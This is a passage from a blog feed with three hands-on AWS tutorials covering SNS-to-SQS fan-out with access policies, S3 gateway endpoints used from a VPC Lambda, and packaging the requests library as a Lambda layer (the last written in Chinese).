        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Amazon SNS offen works well with Amazon SQS, by subscribing SQS to SNS, the SNS service can push messages to SQS. <strong>This may eliminating the need to periodically check or “poll” for updates.</strong></p><h3 id="What-is-Amazon-SQS"><a href="#What-is-Amazon-SQS" class="headerlink" title="What is Amazon SQS?"></a>What is Amazon SQS?</h3><p>By official definition</p><blockquote><p>Amazon SQS is a message queue service used by distributed applications to exchange messages through a polling model, and can be used to decouple sending and receiving components—without requiring each component to be concurrently available. </p></blockquote><h2 id="Scenario"><a href="#Scenario" class="headerlink" title="Scenario"></a>Scenario</h2><blockquote><p>The <strong>Fanout</strong> scenario is when a message published to an SNS topic is replicated and pushed to multiple endpoints, such as Kinesis Data Firehose delivery streams, Amazon SQS queues, HTTP(S) endpoints, and Lambda functions. This allows for parallel asynchronous processing.<br>For example, you can develop an application that publishes a message to an SNS topic whenever an order is placed for a product. Then, SQS queues that are subscribed to the SNS topic receive identical notifications for the new order. An Amazon Elastic Compute Cloud (Amazon EC2) server instance attached to one of the SQS queues can handle the processing or fulfillment of the order. And you can attach another Amazon EC2 server instance to a data warehouse for analysis of all orders received.[1]</p></blockquote><h2 id="Steps"><a href="#Steps" class="headerlink" title="Steps"></a>Steps</h2><p>Here we will go through each step of fan out to Amazon SQS.</p><p>The initial step is to remember both SNS arn and SQS arn.</p><h3 id="Create-SQS-Queue"><a href="#Create-SQS-Queue" class="headerlink" title="Create SQS Queue"></a>Create SQS Queue</h3><p>First, you’ll need to create a standard queue in SQS console</p><p><img src="https://i.imgur.com/RRffWm5.png" alt="Imgur"></p><p>After creating the standard queue, it will shows the arn.</p><p>Make sure noted this arn, you’ll need to provide this arn when creating the subscriptions</p><h3 id="Create-SNS-Topic"><a href="#Create-SNS-Topic" class="headerlink" title="Create SNS Topic"></a>Create SNS Topic</h3><p>Second, you need to create a SNS topic in the SNS console..</p><p><img src="https://i.imgur.com/ygA6g1P.png" alt="Imgur"></p><p>And again, you’ll need to note the topic arn.</p><h3 id="Provide-Permission-to-SNS-to-send-messages-to-SQS"><a href="#Provide-Permission-to-SNS-to-send-messages-to-SQS" class="headerlink" title="Provide Permission to SNS to send messages to SQS"></a>Provide Permission to SNS to send messages to SQS</h3><p>By default, SNS will not have permission to send messages to SQS, so you need to provide permission to SNS for sending messages.</p><ul><li>Go to SQS Console</li><li>Press “Edit” in the top corner</li><li>Scroll down to the “Access Policy”</li></ul><p><img src="https://i.imgur.com/keRSRlR.png" alt="Imgur"></p><ul><li>Append new statement in the Access Policy</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Service&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sns.amazonaws.com&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;sqs:DeleteMessage&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;sqs:ReceiveMessage&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;sqs:SendMessage&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sqs:us-east-1:xxxxxxxxxxxx:QueueforSNS&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;ArnEquals&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;aws:SourceArn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sns:us-east-1:xxxxxxxxxxxx:StandardTopicforSQS&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/UWjKND7.png" alt="Imgur"></p><h3 id="Subscribe-SQS-queue-to-SNS-topic"><a href="#Subscribe-SQS-queue-to-SNS-topic" class="headerlink" title="Subscribe SQS queue to SNS topic"></a>Subscribe SQS queue to SNS topic</h3><p>Now you’ll need to subscribe the SQS queue to the SNS topic.</p><ul><li>Go to SNS console</li><li>Scroll down and choose “Create Subscription”</li></ul><p><img src="https://i.imgur.com/qTEPbQb.png" alt="Imgur"></p><ul><li>Choose your topic arn</li><li>Set the protocal to SQS</li><li>Choose the SQS arn</li></ul><p><img src="https://i.imgur.com/voJqHuB.png" alt="Imgur"></p><p>Once complete, you will notice that the subscripe confirmation also completes. If you create a SQS type subscription by using console, you don’t need confirm the subscription manually.</p><p><img src="https://i.imgur.com/Jr4Brob.png" alt="Imgur"></p><blockquote><p><strong>But if you create a cross-account subscription, you will receive the confirmation url in the SQS queue, and you will need to click the confirmation URL. [3]</strong></p></blockquote><h3 id="Provide-Permission-to-User-for-topic-x2F-queue-operations"><a href="#Provide-Permission-to-User-for-topic-x2F-queue-operations" class="headerlink" title="Provide Permission to User for topic&#x2F;queue operations"></a>Provide Permission to User for topic&#x2F;queue operations</h3><p>You can add permissions to an IAM User to publish SNS messages to a topic.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sns:Publish&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sns:us-east-2:XXXXXXXXXXXX:MyTopic&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>And you also need to provide permissions to SQS queue to recieve and delete messages</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;sqs:ReceiveMessage&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;sqs:DeleteMessage&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:sqs:us-east-2:XXXXXXXXXXXX:MyQueue1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:sqs:us-east-2:XXXXXXXXXXXX:MyQueue2&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>However,if you want to perform cross-account operations, you will need to provide permissions to the other account.</p><p>For example, if you want to let acount: 111122223333 to publish messages to SNS topic in your account, here is an example policy.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;AWS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;111122223333&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sns:Publish&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sns:us-east-2:XXXXXXXXXXXXX:MyTopic&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>if you want to let acount: 111122223333 to perform receive abd delete messages to queue in your account, here is an example policy.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;AWS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;111122223333&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;sqs:DeleteMessage&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;sqs:ReceiveMessage&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:sqs:us-east-2:XXXXXXXXXXXX:MyQueue&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Test-subscription"><a href="#Test-subscription" class="headerlink" title="Test subscription"></a>Test subscription</h3><p>Now we can test the message delivery to the queue.</p><ul><li>Go to the SNS console</li><li>Press “Push Message” in the top right corner </li><li>Enter the message subject and meesage body</li></ul><p><img src="https://i.imgur.com/iu7VJVX.png" alt="Imgur"><br><img src="https://i.imgur.com/ppgfOf0.png" alt="Imgur"></p><ul><li>Go to the SQS console</li><li>Press “Send and Receive Message” in the top right corner</li><li>Scroll down , and press the “Poll for all messages”</li><li>And you’ll find the messages are in polling progress.</li></ul><p><img src="https://i.imgur.com/aYWXVIE.png" alt="Imgur"></p><ul><li>Then the test meesages showed in the console</li></ul><p><img src="https://i.imgur.com/Vj3cCc9.png" alt="Imgur"></p><h2 id="Conclusions"><a href="#Conclusions" class="headerlink" title="Conclusions"></a>Conclusions</h2><p>We successfully fan out the message from the Amazon SNS to the Amazon SQS. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://docs.aws.amazon.com/sns/latest/dg/sns-common-scenarios.html#SNSFanoutScenario">https://docs.aws.amazon.com/sns/latest/dg/sns-common-scenarios.html#SNSFanoutScenario</a><br>[2] <a href="https://docs.aws.amazon.com/zh_tw/sns/latest/dg/sns-sqs-as-subscriber.html">https://docs.aws.amazon.com/zh_tw/sns/latest/dg/sns-sqs-as-subscriber.html</a><br>[3]<a href="https://docs.aws.amazon.com/zh_tw/sns/latest/dg/sns-send-message-to-sqs-cross-account.html">https://docs.aws.amazon.com/zh_tw/sns/latest/dg/sns-send-message-to-sqs-cross-account.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> SNS </tag>
            
            <tag> SQS </tag>
            
            <tag> Publish-Subscribe-Model </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hands-On Practice: S3 Gateway Endpoints</title>
      <link href="/posts/e7e295f6.html"/>
      <url>/posts/e7e295f6.html</url>
      
        <content type="html"><![CDATA[<h1 id="What-is-S3-Gateway-Endpoints"><a href="#What-is-S3-Gateway-Endpoints" class="headerlink" title="What is S3 Gateway Endpoints?"></a>What is S3 Gateway Endpoints?</h1><p><img src="https://i.imgur.com/MUsKNi4.png" alt="Imgur"></p><p>Let’s consider a scenario</p><blockquote><p>How could your Lambda function access the content in the S3 bucket?</p></blockquote><p>If you want a service to access the content in the S3 bucket, it usually go through VPC endpoint. S3 supports two types of VPC endpoint,each of which is <strong>Gateway endpoint</strong> and <strong>Interface endpoint</strong></p><!--如果要通過一個服務來存取 S3 當中的內容，通常是會通過 VPC Endpoint，而在 S3 當中又支援兩種不同的 VPC Endpoint類型，分別是 **Gateway Endpoint** 以及 **Interface Endpoint**--><p>The diffeences between two types of VPC endpoints are listed below</p><table><thead><tr><th>S3 Gateway Endpoints</th><th>S3 Interface Endpoints</th></tr></thead><tbody><tr><td>Use S3 Public IP Address</td><td>Use Private IP Address in VPC to access S3</td></tr><tr><td>Use the same S3 DNS Name</td><td>Name must include VPC Endpoint ID [3]</td></tr><tr><td>cannot access internally</td><td>can access internally</td></tr><tr><td>cannot access from other AWS region</td><td>can access from other AWS region by using VPC peering or AWS Transit gateway</td></tr><tr><td>Free</td><td>In chrarge</td></tr></tbody></table><!-- >> **所以當你的情境是你在同個 Region 底下有個 Lambda 函數想要存取 S3 的內容，那就很適合使用 Gateway Endpoint** --><blockquote><p>So if your scenario is that a Lambda function want to access the content in S3 bucket in the same region, it is great to utilize the Gateway Endpoint</p></blockquote><h2 id="Consideration-of-S3-Gateway-Endpoint"><a href="#Consideration-of-S3-Gateway-Endpoint" class="headerlink" title="Consideration of S3 Gateway Endpoint"></a>Consideration of S3 Gateway Endpoint</h2><p>It is worth to mestion that there are several things you need to consider before choosing S3 Gateway Endpoints, make sure you go through the section in the official documentation</p><blockquote><p><a href="https://docs.aws.amazon.com/vpc/latest/privatelink/vpc-endpoints-s3.html#gateway-endpoint-considerations-s3">https://docs.aws.amazon.com/vpc/latest/privatelink/vpc-endpoints-s3.html#gateway-endpoint-considerations-s3</a></p></blockquote><h2 id="Private-DNS"><a href="#Private-DNS" class="headerlink" title="Private DNS"></a>Private DNS</h2><p>When you are trying yo create Gateway Endpoint or Interface Endpoint for your S3, you can decide creating private DNS for cost down.</p><blockquote><p>This is implement by Route53 Resolver<br>For detail you can check：<a href="https://docs.aws.amazon.com/zh_tw/Route53/latest/DeveloperGuide/resolver.html">https://docs.aws.amazon.com/zh_tw/Route53/latest/DeveloperGuide/resolver.html</a></p></blockquote><h1 id="Steps-for-building-Gateway-Endpoint"><a href="#Steps-for-building-Gateway-Endpoint" class="headerlink" title="Steps for building Gateway Endpoint"></a><a href="https://docs.aws.amazon.com/zh_tw/vpc/latest/privatelink/vpc-endpoints-s3.html#create-gateway-endpoint-s3">Steps for building Gateway Endpoint</a></h1><ul><li>Go to AWS Console to create the endpoint</li></ul><blockquote><p>VPC &#x2F; Endpoints &#x2F; Create Endpoint</p></blockquote><p><img src="https://i.imgur.com/asOslk6.png" alt="Imgur"></p><ul><li>Choose <code>AWS services</code> , and <code>com.amaazonaws.us-east-1.s3</code></li></ul><p><img src="https://i.imgur.com/ujgXmUq.png" alt="Imgur"></p><ul><li>Then, press create endpoints</li></ul><h2 id="Associate-Route-Table"><a href="#Associate-Route-Table" class="headerlink" title="Associate Route Table"></a>Associate Route Table</h2><ul><li>Make sure the route table that assoicate to the gateway endpoint is clean.<blockquote><p>If you don’t have on, then make one.</p></blockquote></li></ul><p><img src="https://i.imgur.com/cI4mrOt.png" alt="Imgur"></p><h2 id="Configure-policy"><a href="#Configure-policy" class="headerlink" title="Configure policy"></a>Configure policy</h2><ul><li>For testing purposes, I choose <code>Full Access</code></li></ul><p><img src="https://i.imgur.com/kiQtSej.png" alt="Imgur"></p><ul><li>Then, press create endpoint</li></ul><h2 id="Check-the-routing"><a href="#Check-the-routing" class="headerlink" title="Check the routing"></a>Check the routing</h2><p>After establishing the endpoint, you can check if the default route of route table is well configured</p><p><img src="https://i.imgur.com/3Ajfl91.png" alt="Imgur"></p><p>Next, we must configure a Lambda function for accessing S3 bucket.</p><h2 id="Configure-Lambda-Function"><a href="#Configure-Lambda-Function" class="headerlink" title="Configure Lambda Function"></a>Configure Lambda Function</h2><p>If you put a Lambda funciton into a VPC, it will attach to 2 subnets by defaults.</p><p>Make sure two subnet have default route to S3 Gateway Endpoints.</p><p><img src="https://i.imgur.com/XmbfUKe.png" alt="Imgur"><br><img src="https://i.imgur.com/AP6fZGy.png" alt="Imgur"></p><ul><li>Create Lambda function, and enable the VPC</li></ul><p><img src="https://i.imgur.com/eBfWExA.png" alt="Imgur"></p><ul><li>Lambda Code</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> boto3</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lambda_handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;CREATE CLIENT&quot;</span>)</span><br><span class="line">    s3 = boto3.client(<span class="string">&quot;s3&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;START REQUEST&quot;</span>)</span><br><span class="line">    resp = s3.list_objects(Bucket=<span class="string">&quot;testbucket4-s3gateway-endpoint&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(resp)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;statusCode&#x27;</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="string">&#x27;body&#x27;</span>: json.dumps(<span class="string">&#x27;Hello from Lambda!&#x27;</span>)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>In this Lambda code, Lambda will try to list the objects in the bucket, can print out the information of  response object in the log.</p><ul><li>Configure policy of Lambda execution role</li></ul><p>I simply attach AWS Managed Policy <code>AmazonS3FullAccess</code> to the execution role for testing</p><blockquote><p>Notice, you should not give full access to your Lambda function in production mode, make sure giving adequient permssion to the role.</p></blockquote><p><img src="https://i.imgur.com/U3mPX0h.png" alt="Imgur"></p><h2 id="Check-invocations"><a href="#Check-invocations" class="headerlink" title="Check invocations"></a>Check invocations</h2><ul><li>Press <code>test</code> button in the Lambda console, you’ll noticee the lambda get invoked successfully</li></ul><p><img src="https://i.imgur.com/WB3iyyD.png" alt="Imgur"></p><ul><li>Then you need to check the invocation logs in CloudWatch</li></ul><p><img src="https://i.imgur.com/j5q8yCp.png" alt="Imgur"></p><p>You can see that the object information were listed and printed out in the invocation logs.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://docs.aws.amazon.com/zh_tw/vpc/latest/privatelink/vpc-endpoints-s3.html#create-gateway-endpoint-s3">https://docs.aws.amazon.com/zh_tw/vpc/latest/privatelink/vpc-endpoints-s3.html#create-gateway-endpoint-s3</a><br>[2] <a href="https://docs.aws.amazon.com/zh_tw/AmazonS3/latest/userguide/privatelink-interface-endpoints.html#types-of-vpc-endpoints-for-s3">https://docs.aws.amazon.com/zh_tw/AmazonS3/latest/userguide/privatelink-interface-endpoints.html#types-of-vpc-endpoints-for-s3</a><br>[3] <a href="https://docs.aws.amazon.com/zh_tw/AmazonS3/latest/userguide/privatelink-interface-endpoints.html#accessing-s3-interface-endpoints">https://docs.aws.amazon.com/zh_tw/AmazonS3/latest/userguide/privatelink-interface-endpoints.html#accessing-s3-interface-endpoints</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> S3 </tag>
            
            <tag> Endpoints </tag>
            
            <tag> Gateway </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lambda_layer 概念和實作</title>
      <link href="/posts/f40d2e89.html"/>
      <url>/posts/f40d2e89.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>針對 Lambda 設定，絕大多數人一定碰過 <code>ImportModuleError</code>  所以各位可以跟著以下的情境，開一個一樣的 Lambda 環境逐步操作。</p><h2 id="情境"><a href="#情境" class="headerlink" title="情境"></a>情境</h2><ul><li>Region: <code>IAD(us-east-1)</code></li><li>Runtime: <code>Python3.11</code></li><li>Lambda Name: “ITHomeLambdaFunction”</li><li>Lambda code<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lambda_handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    <span class="comment"># TODO implement</span></span><br><span class="line">    x = requests.get(<span class="string">&#x27;https://www.ntust.edu.tw/&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(x.text)</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;statusCode&#x27;</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="string">&#x27;body&#x27;</span>: json.dumps(<span class="string">&#x27;Hello from Lambda!&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h2 id="Error-Runtime-ImportModuleError"><a href="#Error-Runtime-ImportModuleError" class="headerlink" title="[Error]: Runtime.ImportModuleError"></a>[Error]: Runtime.ImportModuleError</h2><p>如果你按照上述情境部署，並且進行測試，可能會報出類似下面的錯誤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;errorMessage&quot;: &quot;Unable to import module &#x27;lambda_function&#x27;: No module named &#x27;requests&#x27;&quot;,</span><br><span class="line">  &quot;errorType&quot;: &quot;Runtime.ImportModuleError&quot;,</span><br><span class="line">  &quot;requestId&quot;: &quot;.......&quot;,</span><br><span class="line">  &quot;stackTrace&quot;: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這個錯誤的原因在於，在 AWS Lambda python 3.8 Runtime 之後的版本就沒有原生支援 requests 模組，會需要自己添加<strong>層（layer）</strong></p><h2 id="什麼是-Lambda-層（Layer）"><a href="#什麼是-Lambda-層（Layer）" class="headerlink" title="什麼是 Lambda 層（Layer）"></a>什麼是 Lambda 層（Layer）</h2><p>在 Lambda 中， Layer 是用來存放dependency 或者是模組用的zip 壓縮檔。不同的 Lambda 函數也可以通過 layer 來去共享資料。</p><p>一旦你為你的 Lambda 函數新增一個 Layer，<strong>Lambda 就會去將你 layer當中的資料放到 Lambda 執行環境中的 <code>/opt</code> 目錄底下</strong>。</p><p><img src="https://hackmd.io/_uploads/H1a_iXvk6.png"></p><blockquote><p>注意： 每個函數最多只能包含5個 Layer </p></blockquote><h2 id="打包模組到-Layer"><a href="#打包模組到-Layer" class="headerlink" title="打包模組到 Layer"></a>打包模組到 Layer</h2><p>每個 Layer 當中的模組，隨著你使用 Runtime 的不同，打包 zip檔時會需要遵循不同的檔案結構 [1]。</p><p>以 Python 來說 檔案結構可以是:</p><ul><li><code>/opt/python</code></li><li><code>/opt/python/lib/python3.x/site-packages </code></li></ul><p>而所有 Runtime 都支援以下兩種額外的目錄：</p><ul><li><code>/bin (PATH)</code></li><li><code>/lib (LD_LIBRARY_PATH)</code></li></ul><p>現在我們就來為 requests 打包成壓縮檔吧</p><ol><li>本機封裝層內容，請執行下面的指令，若您的套件安裝工具是 pip3 則將指令開頭替換成 pip3</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests --target=./python </span><br></pre></td></tr></table></figure><p>這會在你本地當中建立 python&#x2F; 目錄，並將所需的模組下載到目錄中，請注意這裡的目錄名稱需要與 Runtime 所使用的語言匹配。</p><ol start="2"><li><p>打包目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -r layer.zip python/</span><br></pre></td></tr></table></figure><p>去將 python 目錄底下的所有檔案打包至一個 zip檔</p></li><li><p>在Lambda 主控台中，左側導覽區域中有個 <strong>layer</strong>，點選後會跳轉至layer頁面，可以在頁面中選擇新增新的layer</p></li></ol><p><img src="https://hackmd.io/_uploads/SyjslEwya.png"></p><p>為Layer 取名並且在頁面中上傳剛才建立的 <code>layer.zip</code>，接著選擇 Runtime 以及架構後就可以建立Layer了。</p><p><img src="https://hackmd.io/_uploads/HkELWNPJa.png"></p><p>完成後就回到 Lambda 主頁去新增 Layer</p><p><img src="https://hackmd.io/_uploads/HkbdbNvyp.png"></p><p>新增 Layer 的頁面中選擇 Custom Layer，就可以看到剛剛建立的 Layer了。</p><p><img src="https://hackmd.io/_uploads/S1esbVwJp.png"></p><h2 id="測試"><a href="#測試" class="headerlink" title="測試"></a>測試</h2><p>這時再度從主控台按下測試，就不會報錯了</p><p><img src="https://hackmd.io/_uploads/rkNaf4v16.png"></p><p>或者通過 AWS CLI 去調用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aws lambda invoke \</span><br><span class="line">    --cli-binary-format raw-in-base64-out \</span><br><span class="line">    --function-name ITHomeLambdaFunction \</span><br><span class="line">    --payload &#x27;&#123; &quot;Test&quot;: &quot;ITHome&quot; &#125;&#x27; \</span><br><span class="line">    response.json</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/HkRKONw1a.png"></p><p>去看 CloudWatch 也能收到資料</p><blockquote><p>雖然把吐回來的東西拆成一個一個log entry 很怪XD</p></blockquote><p><img src="https://hackmd.io/_uploads/ryK-tEvkp.png"></p><h2 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h2><p>[1] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/packaging-layers.html#packaging-layers-paths">每個 Lambda 執行時間的層路徑</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
